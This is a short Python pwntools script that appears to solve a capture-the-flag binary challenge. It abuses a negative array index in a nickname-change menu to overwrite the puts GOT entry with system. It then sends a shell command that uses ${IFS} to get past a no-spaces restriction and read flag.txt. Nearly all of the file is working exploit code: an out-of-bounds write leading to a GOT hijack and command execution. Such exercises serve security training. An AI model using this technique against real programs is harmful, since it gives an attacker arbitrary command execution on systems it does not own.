from pwn import *

elf = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *change_user_nick+222",
		"b *change_user_nick+259",
		"c"
	]))
elif args.REMOTE:
	p = remote("localhost" if not args.ADDR else args.ADDR, 11310)
else:
	p = process(elf.path) 

p.recvline(b"Your choice: ")
p.sendline(b'2') # change user name
p.sendline(b'-10') # index for change  users-(-10 * 0x10) = puts@got
# overwrite puts with system
p.sendline(p64(elf.symbols['system']))

# from now we have puts that behaving like system 
p.sendline(b'2') # change user name
p.sendline(b'0') # does not matter
p.sendline(b'cat${IFS}flag.txt')  # cat flag, command cant have spaces because of fgets
p.sendline(b'4')

print(p.clean(1.0))
